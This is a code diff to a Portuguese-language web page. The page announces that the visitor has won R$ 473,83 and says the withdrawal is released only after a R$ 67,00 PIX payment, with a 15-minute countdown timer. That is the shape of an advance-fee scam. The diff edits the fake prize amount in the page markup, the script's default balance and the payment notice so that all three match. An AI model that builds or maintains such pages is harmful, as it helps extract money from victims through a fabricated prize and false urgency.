@@ -34,7 +34,7 @@
       <div class="par-label">🎉 PARABÉNS! VOCÊ CONQUISTOU</div>
       <div class="par-amount">
         <span>💰</span>
-        <span id="parAmt">R$ 0,00</span>
+        <span id="parAmt">R$ 473,83</span>
         <span>💰</span>
       </div>
       <p class="par-sub">Última etapa para receber seu dinheiro</p>
@@ -292,7 +292,7 @@
   <script>
     /* ============== STATE ============== */
     const state = JSON.parse(localStorage.getItem('cnp') || '{}');
-    const bal = state.balance ?? 467.83;
+    const bal = state.balance ?? 473.83;
     const fmtBrl = n => 'R$ ' + n.toFixed(2).replace('.', ',');
 
     document.getElementById('parAmt').textContent = fmtBrl(bal);
@@ -488,7 +488,7 @@
         <div class="pix-title">Aguardando Pagamento</div>
         <div class="pix-timer">Expira em: <span id="timer">15:00</span></div>
         <div class="pix-desc">
-          Para liberar seu saque de <strong>R$ 467,83</strong>, finalize o pagamento de
+          Para liberar seu saque de <strong>R$ 473,83</strong>, finalize o pagamento de
           <strong id="pixValorDisplay">R$ 67,00</strong>.
         </div>
       </div>
